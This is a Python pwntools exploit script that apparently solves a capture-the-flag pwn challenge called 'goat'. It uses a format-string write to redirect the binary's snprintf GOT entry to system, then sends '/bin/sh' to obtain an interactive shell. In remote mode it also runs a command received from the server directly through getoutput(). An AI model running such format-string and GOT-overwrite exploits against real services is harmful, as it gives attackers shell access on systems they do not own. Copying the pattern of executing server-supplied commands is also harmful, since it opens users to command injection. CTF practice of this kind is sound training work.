from pwn import *
from subprocess import getoutput


binary = "./goat"
elf = context.binary = ELF(binary, checksec=False)

gs = """
break *main+175
continue
"""

if args.REMOTE:
    p = remote("goat.chal.cyberjousting.com", 1349)

    ### SOLVE POW ###
    p.recvline()
    cmd = p.recvline().decode().strip()
    print(f"Solving POW: {cmd}")
    answer = getoutput(cmd)
    p.sendline(answer.encode())
elif args.GDB:
    context.terminal = ["tmux", "splitw", "-h"]
    p = gdb.debug(binary, gdbscript=gs)
else:
    p = elf.process()



### OVERWRITE SNPRINTF ###
"""
`0x740` are the 3 known nibbles of `system`.

I also append `0x1` because `system` and `snprintf` are far enough apart that
if all bytes of their address are the same except the last 2 bytes, the most
significant nibble of the 2 bytes has to be `0x0` or `0x1`. 
"""

p.recvuntil(b'GOAT...')
payload = fmtstr_payload(8, {elf.got["snprintf"]: p16(0x1740)}, numbwritten=24, write_size='short')
print(payload)
p.sendline(payload)


### SET UP FOR SYSTEM ###
p.recvuntil(b'@@')
p.sendline(b"/bin/sh\x00")

p.interactive()
